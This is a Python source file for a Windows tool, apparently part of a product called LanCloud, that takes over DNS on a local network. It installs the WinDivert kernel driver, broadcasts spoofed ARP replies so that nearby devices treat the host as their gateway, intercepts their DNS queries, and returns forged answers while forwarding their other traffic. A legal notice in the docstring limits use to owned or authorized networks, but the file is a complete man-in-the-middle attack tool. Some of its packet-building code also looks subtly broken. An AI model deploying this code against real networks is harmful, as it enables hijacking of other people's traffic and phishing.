# -*- coding: utf-8 -*-
"""Windows 全自动 DNS 接管（方案 C · 绿色版内置）

原理与 Linux 版 scripts/arp_hijack.py 一致，但走 Windows 内核驱动 WinDivert，
可在【你自己拥有 / 已获授权】的局域网内让其他设备【零配置】地把 DNS 查询
自动送到本机 LanCloud DNS：

  1. 自动安装 WinDivert 内核驱动（绿色版已内置驱动文件，免下载）；
  2. 周期性广播伪造 ARP 应答：告诉目标设备"网关的 MAC 是本机"；
  3. WinDivert 拦截目标的 DNS 查询(53/UDP) → 转发给本机 LanCloud DNS →
     把响应伪装成"网关"返回给目标；
  4. 其余流量由本机转交给真实网关（单向欺骗，网关直接回包给目标），
     正常上网不受影响；
  5. 停止时广播真实网关 MAC，目标设备几十秒内自动恢复。

参考开源项目：WinDivert（https://github.com/basil00/Divert，LGPL-3.0）、
pydivert（https://github.com/ffalcinelli/pydivert，LGPL-3.0）。

法律边界（必读）：ARP 欺骗属于网络中间人技术，只允许在你自己拥有或已获
明确授权的网络和设备上使用。在中国，未经授权截获/劫持他人网络流量违反
《网络安全法》和《刑法》第 285/286 条，用于钓鱼盗号属于犯罪。
"""
import os
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
from collections import deque

_BROADCAST = "ff:ff:ff:ff:ff:ff"


def is_windows() -> bool:
    return sys.platform == "win32"


def is_admin() -> bool:
    if not is_windows():
        return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


# ---------- 驱动安装（全自动，免下载） ----------

def _driver_file() -> str:
    """定位 pydivert 自带的 WinDivert64.sys（PyInstaller 打包后位于 _MEIPASS）"""
    try:
        import pydivert
        base = getattr(sys, "_MEIPASS", os.path.dirname(pydivert.__file__))
        cand = os.path.join(base, "pydivert", "windivert_dll", "WinDivert64.sys")
        if os.path.exists(cand):
            return cand
        # 源码环境：pydivert 包目录
        pkg = os.path.dirname(pydivert.__file__)
        cand = os.path.join(pkg, "windivert_dll", "WinDivert64.sys")
        if os.path.exists(cand):
            return cand
    except Exception:
        pass
    return ""


def driver_installed() -> bool:
    """检查 WinDivert 内核服务是否已安装并运行"""
    if not is_windows():
        return False
    try:
        r = subprocess.run(["sc", "query", "windivert"], capture_output=True,
                           text=True, timeout=10)
        return r.returncode == 0 and ("RUNNING" in r.stdout or "运行" in r.stdout)
    except Exception:
        return False


def install_driver() -> str:
    """自动安装 WinDivert 驱动（复制 .sys + 创建内核服务 + 启动）"""
    if not is_windows():
        return "仅支持 Windows"
    if not is_admin():
        return "需要管理员权限：请右键 LanCloud.exe → 以管理员身份运行"
    if driver_installed():
        return "驱动已就绪"
    src = _driver_file()
    if not src:
        return "未找到内置驱动文件（绿色版应包含 WinDivert64.sys）"
    dst = r"C:\Windows\System32\drivers\WinDivert64.sys"
    try:
        shutil.copy2(src, dst)
    except Exception as e:
        return f"复制驱动失败: {e}"
    # 服务已存在则先删除（可能是半装状态）
    subprocess.run(["sc", "stop", "windivert"], capture_output=True, text=True)
    subprocess.run(["sc", "delete", "windivert"], capture_output=True, text=True)
    r = subprocess.run(
        ["sc", "create", "windivert", "type=", "kernel", "start=", "demand",
         "binPath=", r"\SystemRoot\System32\drivers\WinDivert64.sys",
         "DisplayName=", "WinDivert Packet Divert"],
        capture_output=True, text=True)
    if r.returncode != 0 and "already exists" not in r.stderr.lower() and "已存在" not in r.stderr:
        return f"创建服务失败: {r.stderr.strip() or r.stdout.strip()}"
    r = subprocess.run(["sc", "start", "windivert"], capture_output=True, text=True)
    if driver_installed():
        return "驱动安装成功"
    return f"驱动启动失败: {r.stderr.strip() or r.stdout.strip()}"


# ---------- 网络信息（纯函数便于测试） ----------

def _parse_ipconfig(text: str):
    """从 ipconfig 输出提取 (网关IP, 本机IP, 本机MAC)。中文/英文输出兼容。"""
    ip_re = r"(\d{1,3}(?:\.\d{1,3}){3})"
    gw = my_ip = mac = None
    section = {}
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        # 段落边界：适配器名（无前导空格）
        if not raw[:1].isspace() and ("适配器" in line or "adapter" in line.lower()):
            if section.get("gw") and gw is None:
                gw = section["gw"]
            if section.get("ip") and my_ip is None:
                my_ip = section["ip"]
            if section.get("mac") and mac is None:
                mac = section["mac"]
            section = {}
            continue
        m = re.search(r"IPv4[^\d]*?" + ip_re, line)
        if m and section.get("ip") is None:
            section["ip"] = m.group(1)
        m = re.search(r"(?:物理地址|Physical Address)[^0-9A-Fa-f]*?"
                      r"([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})", line)
        if m and section.get("mac") is None:
            section["mac"] = m.group(1).replace("-", ":").lower()
        m = re.search(r"(?:默认网关|Default Gateway)[^\d]*?" + ip_re, line)
        if m:
            section["gw"] = m.group(1)
    if section.get("gw") and gw is None:
        gw = section["gw"]
    if gw is None:
        return None
    my_ip = section.get("ip") or my_ip
    mac = section.get("mac") or mac
    return {"gw": gw, "ip": my_ip, "mac": mac}


def get_network_info():
    """实际获取网络信息（Windows）"""
    if not is_windows():
        raise RuntimeError("仅支持 Windows")
    try:
        out = subprocess.run(["ipconfig"], capture_output=True, text=True,
                             timeout=15).stdout
    except Exception as e:
        raise RuntimeError(f"ipconfig 执行失败: {e}")
    info = _parse_ipconfig(out)
    if not info or not info.get("ip"):
        raise RuntimeError("无法从 ipconfig 识别网关/本机 IP（请检查网络连接）")
    return info


def _parse_arp(text: str, exclude=()):
    """从 arp -a 输出提取 {ip: mac}，排除网关/本机/组播"""
    targets = {}
    for m in re.finditer(r"(\d{1,3}(?:\.\d{1,3}){3})\s+"
                         r"([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})", text):
        ip, mac = m.group(1), m.group(2).replace("-", ":")
        if ip in exclude:
            continue
        if ip.startswith(("224.", "239.", "255.")):
            continue
        targets[ip] = mac
    return targets


def discover_targets(net: dict) -> dict:
    out = subprocess.run(["arp", "-a"], capture_output=True, text=True,
                         timeout=15).stdout
    return _parse_arp(out, exclude={net["gw"], net["ip"]})


def get_gateway_mac(net: dict) -> str:
    """通过 arp -a 找网关 MAC（首次可能为空，需触发一次通信）"""
    out = subprocess.run(["arp", "-a"], capture_output=True, text=True,
                         timeout=15).stdout
    targets = _parse_arp(out, exclude=())
    return targets.get(net["gw"], "")


def _mac_to_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))


# ---------- 包构造 ----------

def _eth_frame(dst_mac: str, src_mac: str, etype: int) -> bytes:
    return _mac_to_bytes(dst_mac) + _mac_to_bytes(src_mac) + etype.to_bytes(2, "big")


def build_arp(op: int, sha: str, spa: str, tha: str, tpa: str) -> bytes:
    """构造以太 + ARP 帧（42 字节）"""
    body = b"\x00\x01\x08\x00\x06\x04" + op.to_bytes(2, "big")
    body += _mac_to_bytes(sha) + socket.inet_aton(spa)
    body += _mac_to_bytes(tha) + socket.inet_aton(tpa)
    return _eth_frame(_BROADCAST, sha, 0x0806) + body


def build_dns_response(dst_mac: str, src_mac: str, src_ip: str, dst_ip: str,
                       dns_payload: bytes) -> bytes:
    """构造伪装成 DNS 服务器(src_ip:53) 的 UDP 响应帧"""
    eth = _eth_frame(dst_mac, src_mac, 0x0800)
    iph = bytearray(20)
    iph[0] = 0x45
    total = 20 + 8 + len(dns_payload)
    iph[2:4] = total.to_bytes(2, "big")
    iph[4:6] = os.urandom(2)            # ID
    iph[8] = 64                          # TTL
    iph[9] = 17                          # UDP
    iph[12:16] = socket.inet_aton(src_ip)
    iph[16:20] = socket.inet_aton(dst_ip)
    udp = bytearray(8)
    udp[0:2] = (53).to_bytes(2, "big")   # 源端口 = DNS 53
    udp[2:4] = (0).to_bytes(2, "big")    # 目的端口占位，下面填
    udp[4:6] = (8 + len(dns_payload)).to_bytes(2, "big")
    return bytes(eth) + bytes(iph) + bytes(udp) + dns_payload


def _parse_dns_qname(payload: bytes) -> str:
    """从 DNS 查询字节中提取查询域名（失败返回 ''）"""
    try:
        i = 12
        parts = []
        while i < len(payload):
            n = payload[i]
            if n == 0:
                break
            i += 1
            parts.append(payload[i:i + n].decode("ascii", "ignore"))
            i += n
        return ".".join(parts)
    except Exception:
        return ""


# ---------- 劫持引擎 ----------

class HijackEngine:
    def __init__(self, net: dict, dns_port: int = 53):
        self.net = net
        self.dns_port = dns_port
        self.running = False
        self.targets = {}
        self.log = deque(maxlen=100)     # (time, msg)
        self._dns_h = None               # WinDivert handle
        self._fwd_h = None
        self._threads = []

    def _log(self, msg: str):
        self.log.appendleft((int(time.time()), msg))

    def start(self, targets: dict):
        from pydivert import Packet, WinDivert
        self.targets = dict(targets)
        gw_mac = self.net.get("gw_mac") or ""
        if not gw_mac:
            raise RuntimeError("无法获取网关 MAC，请先访问一次外网后重试")
        my_mac = self.net["mac"]
        f_self = f'!(ether.SrcHost == "{my_mac}")'
        self._dns_h = WinDivert(f"udp.DstPort == 53 && ip && {f_self}")
        self._fwd_h = WinDivert(
            f"!(udp.DstPort == 53 || tcp.DstPort == 53) && {f_self} && (ip || arp)")
        self._dns_h.open()
        self._fwd_h.open()
        self.running = True
        self._threads = [
            threading.Thread(target=self._spoof_loop, daemon=True),
            threading.Thread(target=self._dns_loop, daemon=True),
            threading.Thread(target=self._fwd_loop, daemon=True),
        ]
        for t in self._threads:
            t.start()
        self._log(f"已接管 {len(self.targets)} 台设备：{'、'.join(self.targets)}")

    def stop(self):
        self.running = False
        for h in (self._dns_h, self._fwd_h):
            if h is not None:
                try:
                    h.close()
                except Exception:
                    pass
        self._dns_h = self._fwd_h = None
        # 广播真实网关 MAC，让目标设备恢复直连网关
        gw_mac = self.net.get("gw_mac") or ""
        if gw_mac:
            for _ in range(3):
                for ip in self.targets:
                    try:
                        self._send_raw(build_arp(2, gw_mac, self.net["gw"],
                                                 _BROADCAST, ip))
                    except Exception:
                        pass
                time.sleep(0.3)
        self._log("已恢复：真实网关 ARP 已广播，设备将自动纠正")

    def _send_raw(self, raw: bytes):
        from pydivert import Packet
        if self._fwd_h is not None:
            self._fwd_h.send(Packet(raw=raw))

    # --- 线程1：ARP 欺骗 ---
    def _spoof_loop(self):
        while self.running:
            try:
                for ip in self.targets:
                    self._send_raw(build_arp(2, self.net["mac"], self.net["gw"],
                                             _BROADCAST, ip))
            except Exception:
                pass
            time.sleep(2)

    # --- 线程2：DNS 拦截 ---
    def _dns_loop(self):
        while self.running:
            try:
                p = self._dns_h.recv()
            except Exception:
                if self.running:
                    continue
                break
            try:
                ip, udp = p.ipv4, p.udp
                q = bytes(p.payload)
                if not q:
                    continue
                # 转发给本机 LanCloud DNS，拿响应后伪装成"目标期望的 DNS 服务器"
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(3)
                s.sendto(q, ("127.0.0.1", self.dns_port))
                resp = s.recv(4096)
                s.close()
                if not resp:
                    continue
                src_mac = self.net["mac"]
                # 源 IP = 查询包的目的 IP（目标以为在跟它选定的 DNS 通信）
                frame = build_dns_response(ip.src_addr, src_mac, ip.dst_addr,
                                           ip.src_addr, resp)
                # 补上目标的 UDP 源端口
                f = bytearray(frame)
                f[14 + 20 + 2:14 + 20 + 4] = udp.src_port.to_bytes(2, "big")
                self._dns_h.send(Packet(raw=bytes(f)))
                self._log(f"DNS {ip.src_addr} 查询 {_parse_dns_qname(q) or '(无法解析)'}")
            except Exception as e:
                self._log(f"DNS 处理失败: {e}")

    # --- 线程3：流量转发（保证上网 + 吞掉网关 ARP 应答） ---
    def _fwd_loop(self):
        from pydivert import Packet
        gw_mac = self.net.get("gw_mac") or ""
        gw_mac_b = _mac_to_bytes(gw_mac) if gw_mac else b""
        while self.running:
            try:
                p = self._fwd_h.recv()
            except Exception:
                if self.running:
                    continue
                break
            try:
                raw = bytes(p.raw)
                if len(raw) < 14:
                    self._fwd_h.send(p)
                    continue
                etype = raw[12:14]
                if etype == b"\x08\x06":          # ARP
                    arp = raw[14:]
                    if len(arp) >= 28:
                        op = int.from_bytes(arp[6:8], "big")
                        tpa = arp[24:28]
                        # 吞掉"谁是网关"的 ARP 请求，避免目标缓存真实网关 MAC
                        if op == 1 and tpa == socket.inet_aton(self.net["gw"]):
                            continue
                    self._fwd_h.send(p)
                else:                              # IP
                    ip = p.ipv4
                    if ip is None:
                        self._fwd_h.send(p)
                        continue
                    # 穿越流量（目标 ↔ 外网）：目的 MAC 改为网关，出站转发
                    if ip.src_addr != self.net["ip"] and ip.dst_addr != self.net["ip"] \
                            and gw_mac_b:
                        new = bytearray(raw)
                        new[0:6] = gw_mac_b
                        self._fwd_h.send(Packet(raw=bytes(new)))
                    else:
                        self._fwd_h.send(p)        # 发往本机/本机发出 → 透传
            except Exception:
                try:
                    self._fwd_h.send(p)
                except Exception:
                    pass
